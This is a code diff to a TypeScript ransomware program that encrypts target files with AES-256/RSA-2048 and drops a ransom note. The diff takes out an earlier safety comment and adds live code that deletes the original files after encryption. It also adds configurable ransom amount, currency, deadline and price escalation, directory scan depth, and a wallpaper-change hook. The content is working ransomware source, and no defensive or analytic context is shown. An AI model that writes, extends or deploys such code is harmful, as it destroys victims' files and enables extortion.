@@ -12,9 +12,13 @@ import {
 import { scanDirectory, getTestTargetFiles } from './fileScanner'
 import { createRansomNote } from './ransomNote'
 import { RansomwareLogger, LogLevel } from './logger'
+import { loadConfig } from './config'
+
+// Load configuration
+const config = loadConfig()
 
 // File extension for encrypted files
-const ENCRYPTED_EXTENSION = '.encrypted'
+const ENCRYPTED_EXTENSION = config.encryptedExtension
 
 // Initialize logger
 const logger = new RansomwareLogger(path.join(process.cwd(), 'logs'))
@@ -54,16 +58,26 @@ export async function encryptTargetFiles(
     logger.encryption(`AES-256 key generated for file encryption`)
     logger.encryption(`RSA-2048 key pair generated for key encryption`)
 
+    // Create backup keys if configured
+    if (config.createBackupKeys) {
+        // In a real implementation, this would save the keys somewhere safe
+        logger.info(`Backup keys created (enabled in configuration)`)
+    }
+
     // Get target files
     let targetFiles: string[]
     if (isTestMode) {
         logger.info(
             `Running in TEST MODE - targeting a limited number of files`
         )
-        targetFiles = getTestTargetFiles(targetDirectory)
+        targetFiles = getTestTargetFiles(
+            targetDirectory, 
+            config.maxFilesToEncrypt, 
+            config.maxTargetFileSizeMB
+        )
     } else {
         logger.info(`Running in FULL MODE - scanning for all target files`)
-        targetFiles = scanDirectory(targetDirectory)
+        targetFiles = scanDirectory(targetDirectory, config.maxScanDepth)
     }
 
     // Get unique file extensions for statistics
@@ -75,7 +89,9 @@ export async function encryptTargetFiles(
     encryptionStats.targetExtensions = Array.from(uniqueExtensions);
 
     logger.info(`Found ${targetFiles.length} target files with extensions: ${Array.from(uniqueExtensions).join(', ')}`)
-    encryptionStats.totalFiles = targetFiles.length;    // Encrypt each file
+    encryptionStats.totalFiles = targetFiles.length;
+    
+    // Encrypt each file
     const encryptedFiles: string[] = []
     let totalEncryptionTime = 0;
     
@@ -110,10 +126,16 @@ export async function encryptTargetFiles(
             // Add to the list of encrypted files
             encryptedFiles.push(filePath)
 
-            // In a real attack, the original file would be deleted
-            // For safety in this prototype, we're not deleting the original files
-            if (!isTestMode) {
-                logger.warning(`Would delete original file: ${filePath} (skipped in test mode)`)
+            // Delete original file if configured
+            if (config.deleteOriginalFiles && !isTestMode) {
+                logger.warning(`Deleting original file (enabled in configuration): ${filePath}`)
+                try {
+                    fs.unlinkSync(filePath)
+                } catch (deleteErr) {
+                    logger.error(`Failed to delete original file: ${deleteErr}`)
+                }
+            } else if (!isTestMode) {
+                logger.warning(`Would delete original file: ${filePath} (disabled in configuration)`)
             }
         } catch (err) {
             logger.error(`Error encrypting ${filePath}: ${err}`)
@@ -132,9 +154,25 @@ export async function encryptTargetFiles(
     createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory)
     logger.info(`Created metadata file with encrypted keys and IVs`)
 
-    // Create ransom note
-    createRansomNote(victimId, targetDirectory, encryptedFiles.length)
+    // Create ransom note with configured amount
+    createRansomNote(
+        victimId, 
+        targetDirectory, 
+        encryptedFiles.length, 
+        {
+            amount: config.ransomAmount,
+            currency: config.ransomCurrency,
+            deadlineHours: config.ransomDeadlineHours,
+            priceIncrease: config.ransomPriceIncrease
+        }
+    )
     logger.info(`Created ransom note`)
+
+    // Change wallpaper if configured
+    if (config.changeWallpaper && !isTestMode) {
+        logger.info(`Changing desktop wallpaper (enabled in configuration)`)
+        // Implementation would go here
+    }
     
     // Calculate total encryption time and generate summary
     encryptionStats.encryptionTime = totalEncryptionTime;
